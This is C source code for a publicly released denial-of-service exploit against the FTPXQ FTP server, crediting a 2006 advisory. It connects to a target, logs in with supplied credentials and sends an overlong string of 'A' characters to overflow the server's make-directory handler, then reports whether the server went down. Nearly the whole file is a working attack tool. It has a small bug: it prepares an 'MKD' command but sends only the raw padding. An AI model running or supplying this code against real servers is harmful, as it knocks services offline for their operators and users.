/*
* 0xf_ftpxq.c - FTPXQ Denial of service exploit.
* Federico Fazzi <federicoautistici.org>
*
* advisory by Eric Sesterhenn.
* -- Server built using the WinsockQ from DataWizard Technologies. A
security
* -- vulnerability in the product allows remote attackers to overflow an
* -- internal buffer by providing an overly long "make directory" request.
*
* r20061025.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

// AAAAAAAAAAAAAAAA..AA*255 in hex format.
char bof[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41";

int main(int argc, char **argv) {
    int sd;
    socklen_t len;
    struct sockaddr_in saddr;
    struct hostent *he;
    char buf[512], tmpbuf[128];

    if(argc != 5) {
        printf("FTPXQ Server - Denial of service exploit.\n"
               "Federico Fazzi <federicoautistici.org>\n\n"
               "usage: %s <hostname> <port> <user> <password>\n", argv[0]);
            exit(1);
    }

    if((he = gethostbyname(argv[1])) == NULL) {
        perror("gethostbyname()");
            exit(1);
    }

    // init socket
    if((sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        perror("socket()");
            exit(1);
    }

    // setup struct
    bzero((char *) &saddr, sizeof(saddr));
    saddr.sin_family = AF_INET;
    bcopy((char *)he->h_addr, (char *)&saddr.sin_addr.s_addr, he->h_length);
    saddr.sin_port = htons(atoi(argv[2]));

    len = sizeof(struct sockaddr);
    // init connection
    if(connect(sd, (struct sockaddr *)&saddr, len) == -1) {
            perror("connect()");
            exit(1);
    }
    printf("FTPXQ Server - Denial of service exploit.\n"
           "Federico Fazzi <federicoautistici.org>\n"
           "---------------------------------------\n");
    puts("connecting..\t\t done");

    // sending a USER data to daemon
    sprintf(buf, "USER %s\r\n", argv[3]);
    write(sd, buf, strlen(buf));
    puts("sending USER data..\t done");

    // sending a PASS data to daemon
    sprintf(buf, "PASS %s\r\n", argv[4]);
    write(sd, buf, strlen(buf));
    puts("sending PASS data..\t done");

    // sending a BOF string with MKD command to host
    sprintf(buf, "MKD %s", bof);
    write(sd, bof, strlen(bof));
    puts("sending MKD bof string.. done");

    // now checking if server i down
    if(read(sd, tmpbuf, sizeof(tmpbuf)) > 0)
        puts("[!] server doesn't vulnerable");
    else
        puts("[+] server getting down.. done");
    close(sd);

    return(0);
}

